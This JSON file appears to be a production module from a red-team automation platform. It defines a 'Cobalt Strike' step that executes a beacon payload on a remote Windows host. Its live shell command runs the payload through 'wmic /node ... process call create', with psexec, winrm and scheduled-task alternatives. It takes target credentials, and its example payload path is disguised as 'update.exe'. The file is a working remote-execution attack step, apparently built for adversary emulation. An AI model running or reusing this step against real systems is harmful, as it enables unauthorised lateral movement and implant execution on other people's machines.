{
  "_payload_version": "2.0",
  "_saved_at": "2026-01-21T20:34:08.059821",
  "_artifact_key": "cs-execute-payload",
  "id": "cs-execute-payload",
  "name": "Execute Payload",
  "icon": "\ud83d\ude80",
  "category": "Cobalt Strike",
  "subcategory": "Execution",
  "tactic": "Execution",
  "tacticName": "Execution",
  "techniqueId": "T1059.001",
  "description": "Execute beacon payload on target system",
  "riskLevel": "high",
  "estimatedDuration": 10,
  "executionType": "shell_command",
  "shellCommand": "wmic /node:${target_ip} process call create ${payload_path}",
  "inputs": [
    {
      "id": "remote_path",
      "label": "Remote Payload Path",
      "type": "string",
      "required": true,
      "description": "Path to payload on target"
    }
  ],
  "outputs": [
    {
      "id": "execution_result",
      "label": "Execution Result",
      "type": "boolean",
      "description": "Whether execution succeeded"
    }
  ],
  "parameters": [
    {
      "id": "target_ip",
      "label": "Target IP",
      "type": "string",
      "required": true,
      "default": "${TARGET_IP}",
      "placeholder": "10.0.0.100",
      "description": "Target system IP address"
    },
    {
      "id": "payload_path",
      "label": "Payload Path",
      "type": "string",
      "required": true,
      "default": "${REMOTE_PAYLOAD_PATH}",
      "placeholder": "C:\\Windows\\Temp\\update.exe",
      "description": "Path to payload on target"
    },
    {
      "id": "execution_method",
      "label": "Execution Method",
      "type": "select",
      "required": true,
      "default": "wmic",
      "options": [
        "wmic",
        "psexec",
        "winrm",
        "ssh",
        "at",
        "schtasks"
      ],
      "description": "Remote execution method"
    },
    {
      "id": "target_user",
      "label": "Target User",
      "type": "string",
      "required": false,
      "default": "${TARGET_USER}",
      "placeholder": "administrator",
      "description": "Username for authentication (if required)"
    },
    {
      "id": "target_pass",
      "label": "Target Password",
      "type": "string",
      "required": false,
      "default": "${TARGET_PASS}",
      "placeholder": "",
      "description": "Password for authentication (if required)"
    }
  ],
  "requirements": {
    "c2Server": false,
    "listeners": [],
    "payloads": [
      "remote_path"
    ],
    "sshConnections": [],
    "externalTools": [
      "wmic",
      "psexec"
    ],
    "libraries": [
      "Process",
      "SSHLibrary"
    ]
  },
  "metadata": {
    "version": "1.0.0",
    "lastUpdated": "2026-01-21T00:00:00Z",
    "updatedBy": "automation-team",
    "validationStatus": "production",
    "changeLog": "Initial release with robotFramework config",
    "owner": "OPFOR Team",
    "status": "production",
    "tags": [
      "execution",
      "remote-execution",
      "wmic",
      "psexec"
    ]
  },
  "robotFramework": {
    "libraries": [
      "Process",
      "SSHLibrary"
    ],
    "resources": [],
    "keyword": "Execute Remote Payload",
    "keywordArgs": [
      {
        "param": "target_ip",
        "arg": "target_ip",
        "format": "%s"
      },
      {
        "param": "payload_path",
        "arg": "path",
        "format": "%s"
      },
      {
        "param": "execution_method",
        "arg": "method",
        "format": "%s"
      },
      {
        "param": "target_user",
        "arg": "username",
        "format": "%s"
      },
      {
        "param": "target_pass",
        "arg": "password",
        "format": "%s"
      }
    ],
    "variables": [
      {
        "name": "EXECUTION_SUCCESS",
        "default": "True",
        "scope": "global"
      }
    ],
    "documentation": "Execute beacon payload on target system",
    "tags": [
      "execution",
      "remote"
    ],
    "timeout": "1m"
  }
}